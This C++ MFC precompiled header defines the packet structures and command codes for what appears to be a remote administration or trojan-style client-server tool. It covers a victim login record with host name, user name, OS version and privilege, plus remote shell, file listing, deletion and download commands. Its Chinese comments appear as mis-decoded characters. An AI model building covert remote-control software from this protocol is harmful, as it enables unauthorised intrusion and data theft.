
// stdafx.h : ��׼ϵͳ�����ļ��İ����ļ���
// ���Ǿ���ʹ�õ��������ĵ�
// �ض�����Ŀ�İ����ļ�

#pragma once

#ifndef _SECURE_ATL
#define _SECURE_ATL 1
#endif

#ifndef VC_EXTRALEAN
#define VC_EXTRALEAN            // �� Windows ͷ���ų�����ʹ�õ�����
#endif

#include "targetver.h"

#define _ATL_CSTRING_EXPLICIT_CONSTRUCTORS      // ĳЩ CString ���캯��������ʽ��

// �ر� MFC ��ĳЩ�����������ɷ��ĺ��Եľ�����Ϣ������
#define _AFX_ALL_WARNINGS

#include <afxwin.h>         // MFC ��������ͱ�׼���
#include <afxext.h>         // MFC ��չ


#include <afxdisp.h>        // MFC �Զ�����



#ifndef _AFX_NO_OLE_SUPPORT
#include <afxdtctl.h>           // MFC �� Internet Explorer 4 �����ؼ���֧��
#endif
#ifndef _AFX_NO_AFXCMN_SUPPORT
#include <afxcmn.h>             // MFC �� Windows �����ؼ���֧��
#endif // _AFX_NO_AFXCMN_SUPPORT

#include <afxcontrolbars.h>     // �������Ϳؼ����� MFC ֧��


//  Header
typedef	struct _HEADER_DATA
{
	int				ID;
	int				flag;
	int				datalength;
	_HEADER_DATA(){
	ID = NULL;
	flag = NULL;
	datalength = 0;
	};
}HEADER;

typedef struct _TRANS_DATA{
	HEADER	header;
}DATA;
//	LOGINDATA
typedef struct _LOGIN_DATA
{
	HEADER			header;
	OSVERSIONINFOEX	OsVerInfoEx;	// version
	IN_ADDR			IPAddress;		// �洢32λ��IPv4�ĵ�ַ���ݽṹ
	wchar_t			HostName[50];	// HostName
	wchar_t	        UserName[50];	// UserName
	int				Privilege;

}LOGIN;
typedef struct _FILE_LIST_DATA
{
	HEADER header;
	WIN32_FIND_DATA findData[10];

	_FILE_LIST_DATA(){
		memset(findData,0,sizeof(findData));
	};
	void Clear(){
		memset(findData,0,sizeof(findData));
	};
}FILE_LIST_DATA;
typedef struct	_FILE_SIZE
{
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
}FILESIZE;

//  Э���־
enum {
	CLIENT_LOGIN	=	20,
	CLIENT_SHELL_START,
	CLIENT_FILE_START,
	CLIENT_SHELL_DATA,
	CLIENT_FILE_DRIVE_LIST,
	CLIENT_FILE_LIST,
	CLIENT_CREATE_FOLDER_FINISH,
	CLIENT_CREATE_FOLDER_FAILED,
	CLIENT_DLELE_FILE_FINISH,
	CLIENT_DLELE_FILE_FAILED,
	CLIENT_CREATE_FILE_FINISH,
	CLIENT_CREATE_FILE_FAILED,
	CLIENT_DELETE_FOLDER_FAILED,
	CLIENT_DELETE_FOLDER_FINISH,
	CLIENT_FILE_SIZE,

	SERVER_ACTIVED	=	500,
	SERVER_NEXT,
	SERVER_SHELLMANAGER,
	SERVER_FILEMANAGER,
	SERVER_FILE_LIST,
	SERVER_CREATE_FOLDER,
	SERVER_DELETE_FILE,
	SERVER_CREATE_FILE,
	SERVER_DELETE_FOLDER,
	SERVER_DOWNLOAD_FILE

};





#ifdef _UNICODE
#if defined _M_IX86
#pragma comment(linker,"/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='x86' publicKeyToken='6595b64144ccf1df' language='*'\"")
#elif defined _M_X64
#pragma comment(linker,"/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*'\"")
#else
#pragma comment(linker,"/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
#endif
#endif

